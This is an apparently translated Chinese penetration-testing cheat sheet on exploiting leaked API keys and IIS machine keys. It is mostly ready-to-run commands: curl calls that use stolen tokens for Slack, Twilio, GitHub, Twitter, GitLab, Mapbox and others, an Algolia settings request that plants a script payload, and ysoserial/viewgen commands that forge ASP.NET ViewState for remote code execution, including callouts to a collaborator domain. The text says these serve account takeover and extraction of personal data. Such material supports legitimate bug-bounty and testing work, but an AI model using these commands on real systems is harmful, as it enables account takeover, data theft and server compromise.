# API Key Leaks - API Key泄露

> API 密钥是一个唯一标识符，用于验证与项目相关的请求。一些开发人员可能会对它们进行硬编码或将其留在公共共享中。

## Summary - 总结

  - [Tools - 工具](#tools---工具)
  - [Exploit - 利用](#exploit---利用)
    - [Google Maps](#google-maps)
    - [Algolia](#algolia)
    - [Slack API Token](#slack-api-token)
    - [Facebook Access Token](#facebook-access-token)
    - [Github client id and client secret](#github-client-id-and-client-secret)
    - [Twilio Account_sid and Auth token](#twilio-account_sid-and-auth-token)
    - [Twitter API Secret](#twitter-api-secret)
    - [Twitter Bearer Token](#twitter-bearer-token)
    - [Gitlab Personal Access Token](#gitlab-personal-access-token)
    - [HockeyApp API Token](#hockeyapp-api-token)
    - [IIS Machine Keys - IIS机器密钥](#iis-machine-keys---iis机器密钥)
      - [识别已知的机器密钥](#识别已知的机器密钥)
      - [解码ViewState](#解码viewstate)
      - [生成ViewState用于RCE](#生成viewstate用于rce)
      - [编辑机器密钥cookie](#编辑机器密钥cookie)
    - [Mapbox API Token](#mapbox-api-token)
  - [References](#references)

## Tools - 工具

- [KeyFinder -  一款可让您在网上冲浪时查找密钥的工具！](https://github.com/momenbasel/KeyFinder)

- [KeyHacks - 一个存储库，快速检查泄露的 API 密钥是否有效](https://github.com/streaak/keyhacks)

- [TruffleHog - 查找凭据](https://github.com/trufflesecurity/truffleHog)

  ```shell
  docker run -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --repo https://github.com/trufflesecurity/test_keys
  docker run -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --org=trufflesecurity
  trufflehog git https://github.com/trufflesecurity/trufflehog.git
  trufflehog github --endpoint https://api.github.com --org trufflesecurity --token GITHUB_TOKEN --debug --concurrency 2
  ```

- [Trivy - 通用漏洞和错误配置扫描器，同时搜索 API 密钥](https://github.com/aquasecurity/trivy)

## Exploit - 利用

以下命令可用于接管帐户或使用泄露的令牌从 API 中提取个人信息。

### Google Maps

Google Maps API Scanner: https://github.com/ozguralp/gmapsapiscanner/ 

用法:

| Name                 | Endpoint                                                     |
| -------------------- | ------------------------------------------------------------ |
| Static Maps          | https://maps.googleapis.com/maps/api/staticmap?center=45%2C10&zoom=7&size=400x400&key=KEY_HERE |
| Streetview           | https://maps.googleapis.com/maps/api/streetview?size=400x400&location=40.720032,-73.988354&fov=90&heading=235&pitch=10&key=KEY_HERE |
| Embed                | https://www.google.com/maps/embed/v1/place?q=place_id:ChIJyX7muQw8tokR2Vf5WBBk1iQ&key=KEY_HERE |
| Directions           | https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland&destination=Universal+Studios+Hollywood4&key=KEY_HERE |
| Geocoding            | https://maps.googleapis.com/maps/api/geocode/json?latlng=40,30&key=KEY_HERE |
| Distance Matrix      | [https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&origins=40.6655101,-73.89188969999998&destinations=40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626&key=KEY_HERE](https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&origins=40.6655101,-73.89188969999998&destinations=40.6905615%2C-73.9976592\|40.6905615%2C-73.9976592\|40.6905615%2C-73.9976592\|40.6905615%2C-73.9976592\|40.6905615%2C-73.9976592\|40.6905615%2C-73.9976592\|40.659569%2C-73.933783\|40.729029%2C-73.851524\|40.6860072%2C-73.6334271\|40.598566%2C-73.7527626\|40.659569%2C-73.933783\|40.729029%2C-73.851524\|40.6860072%2C-73.6334271\|40.598566%2C-73.7527626&key=KEY_HERE) |
| Find Place from Text | [https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum%20of%20Contemporary%20Art%20Australia&inputtype=textquery&fields=photos,formatted_address,name,rating,opening_hours,geometry&key=KEY_HERE](https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum of Contemporary Art Australia&inputtype=textquery&fields=photos,formatted_address,name,rating,opening_hours,geometry&key=KEY_HERE) |
| Autocomplete         | [https://maps.googleapis.com/maps/api/place/autocomplete/json?input=Bingh&types=%28cities%29&key=KEY_HERE](https://maps.googleapis.com/maps/api/place/autocomplete/json?input=Bingh&types=(cities)&key=KEY_HERE) |
| Elevation            | https://maps.googleapis.com/maps/api/elevation/json?locations=39.7391536,-104.9847034&key=KEY_HERE |
| Timezone             | https://maps.googleapis.com/maps/api/timezone/json?location=39.6034810,-119.6822510&timestamp=1331161200&key=KEY_HERE |
| Roads                | https://roads.googleapis.com/v1/nearestRoads?points=60.170880,24.942795 |
| Geolocate            | https://www.googleapis.com/geolocation/v1/geolocate?key=KEY_HERE |

可能产生的影响： 

- 消耗公司的每月配额或可能因未经授权使用此服务而超额收费，并对公司造成财务损失。
- 如果 Google 帐户中设置了最大账单限制，则针对该服务执行拒绝服务攻击。

### Algolia

> 译者注：Algolia是一家美国的创业公司，通过SaaS模式提供网络搜索产品。

```
curl --request PUT \
  --url https://<application-id>-1.algolianet.com/1/indexes/<example-index>/settings \
  --header 'content-type: application/json' \
  --header 'x-algolia-api-key: <example-key>' \
  --header 'x-algolia-application-id: <example-application-id>' \
  --data '{"highlightPreTag": "<script>alert(1);</script>"}'
```

### Slack API Token

> 译者注：Slack是一款团队协作沟通工具。

```
curl -sX POST "https://slack.com/api/auth.test?token=xoxp-TOKEN_HERE&pretty=1"
```

### Facebook Access Token

```
curl https://developers.facebook.com/tools/debug/accesstoken/?access_token=ACCESS_TOKEN_HERE&version=v3.2
```

### Github client id and client secret

```
curl 'https://api.github.com/users/whatever?client_id=xxxx&client_secret=yyyy'
```

### Twilio Account_sid and Auth token

```
curl -X GET 'https://api.twilio.com/2010-04-01/Accounts.json' -u ACCOUNT_SID:AUTH_TOKEN
```

### Twitter API Secret

```
curl -u 'API key:API secret key' --data 'grant_type=client_credentials' 'https://api.twitter.com/oauth2/token'
```

### Twitter Bearer Token

```
curl --request GET --url https://api.twitter.com/1.1/account_activity/all/subscriptions/count.json --header 'authorization: Bearer TOKEN'
```

### Gitlab Personal Access Token

```
curl "https://gitlab.example.com/api/v4/projects?private_token=<your_access_token>"
```

### HockeyApp API Token



```
curl -H "X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c" https://rink.hockeyapp.net/api/2/apps/2021bdf2671ab09174c1de5ad147ea2ba4
```

### IIS Machine Keys - IIS机器密钥

> 该机器密钥用于表单身份验证 cookie 数据和视图状态数据的加密和解密，以及进程外会话状态标识的验证。

需要以下内容：

- machineKey **validationKey** and **decryptionKey**
- __VIEWSTATEGENERATOR cookies
- __VIEWSTATE cookies

一个machineKey的示例  https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication.

```
<machineKey validationKey="87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC" decryptionKey="E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7" validation="SHA1" />
```

**web.config** / **machine.config**的常见位置：

- 32-bit
  - C:\Windows\Microsoft.NET\Framework\v2.0.50727\config\machine.config
  - C:\Windows\Microsoft.NET\Framework\v4.0.30319\config\machine.config
- 64-bit
  - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\machine.config
  - C:\Windows\Microsoft.NET\Framework64\v2.0.50727\config\machine.config
- 当启用**自动生成**时在注册表中 (提取方式 machineKeyFinder.aspx：https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab)
  - HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\4.0.30319.0\AutoGenKeyV4
  - HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\2.0.50727.0\AutoGenKey

#### 识别已知的机器密钥

- Exploit with [Blacklist3r/AspDotNetWrapper](https://github.com/NotSoSecure/Blacklist3r)
- Exploit with [ViewGen](https://github.com/0xacb/viewgen)

```
# --webconfig WEBCONFIG: automatically load keys and algorithms from a web.config file
# -m MODIFIER, --modifier MODIFIER: VIEWSTATEGENERATOR value
$ viewgen --guess "/wEPDwUKMTYyODkyNTEzMw9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkuVmqYhhtcnJl6Nfet5ERqNHMADI="
[+] ViewState is not encrypted
[+] Signature algorithm: SHA1

# --encrypteddata : __VIEWSTATE parameter value of the target application
# --modifier : __VIEWSTATEGENERATOR parameter value
$ AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <real viewstate value> --purpose=viewstate --modifier=<modifier value> –macdecode
```

#### 解码ViewState

```
$ viewgen --decode --check --webconfig web.config --modifier CA0B0334 "zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY="

$ .\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate  --modifier=CA0B0334 --macdecode

$ .\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"
```

#### 生成ViewState用于RCE

**NOTE**: 将带有生成的 ViewState 的 POST 请求发送到同一端点，在 Burp 中，应该对有效负载的关键字符进行 URL 编码。

```
$ ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "cmd.exe /c nslookup <your collab domain>"  --decryptionalg="AES" --generator=ABABABAB decryptionkey="<decryption key>"  --validationalg="SHA1" --validationkey="<validation key>"
$ ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\pwn.txt" --generator="CA0B0334" --validationalg="MD5" --validationkey="b07b0f97365416288cf0247cffdf135d25f6be87"
$ ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "C:\Users\zhu\Desktop\ExploitClass.cs;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.dll;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.dll" --generator="CA0B0334" --validationalg="SHA1" --validationkey="b07b0f97365416288cf0247cffdf135d25f6be87"

$ viewgen --webconfig web.config -m CA0B0334 -c "ping yourdomain.tld"
```

#### 编辑机器密钥cookie

如果您有 machineKey 但 ViewState 被禁用。

ASP.net 表单身份验证 Cookies : https://github.com/liquidsec/aspnetCryptTools

```
# decrypt cookie
$ AspDotNetWrapper.exe --keypath C:\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes

# encrypt cookie (edit Decrypted.txt)
$ AspDotNetWrapper.exe --decryptDataFilePath C:\DecryptedText.txt
```

### Mapbox API Token

> 译者注：Mapbox是为Foursquare、Pinterest、Evernote、《金融时报》、天气频道、优步科技等公司的网站提供订制在线地图的大型供应商。

A Mapbox API Token is a JSON Web Token (JWT). If the header of the JWT is `sk`, jackpot. If it's `pk` or `tk`, it's not worth your time.

Mapbox API 令牌是一种 JSON Web 令牌 (JWT)。如果JWT的header是`sk`，那么恭喜你中大奖了。如果是`pk`或`tk`，那不值得你花时间。

```
# 检查Token有效性
curl "https://api.mapbox.com/tokens/v2?access_token=YOUR_MAPBOX_ACCESS_TOKEN"

# 获取与帐户关联的所有令牌的列表
# 仅当令牌是秘密令牌 (sk) 并且具有适当的范围时才有效
curl "https://api.mapbox.com/tokens/v2/MAPBOX_USERNAME_HERE?access_token=YOUR_MAPBOX_ACCESS_TOKEN"
```

## References

- [Finding Hidden API Keys & How to use them - Sumit Jain - August 24, 2019](https://medium.com/@sumitcfe/finding-hidden-api-keys-how-to-use-them-11b1e5d0f01d)
- [Private API key leakage due to lack of access control - yox - August 8, 2018](https://hackerone.com/reports/376060)
- [Project Blacklist3r - November 23, 2018 - @notsosecure](https://www.notsosecure.com/project-blacklist3r/)
- [Saying Goodbye to my Favorite 5 Minute P1 - Allyson O'Malley - January 6, 2020](https://www.allysonomalley.com/2020/01/06/saying-goodbye-to-my-favorite-5-minute-p1/)
- [Mapbox API Token Documentation](https://docs.mapbox.com/help/troubleshooting/how-to-use-mapbox-securely/)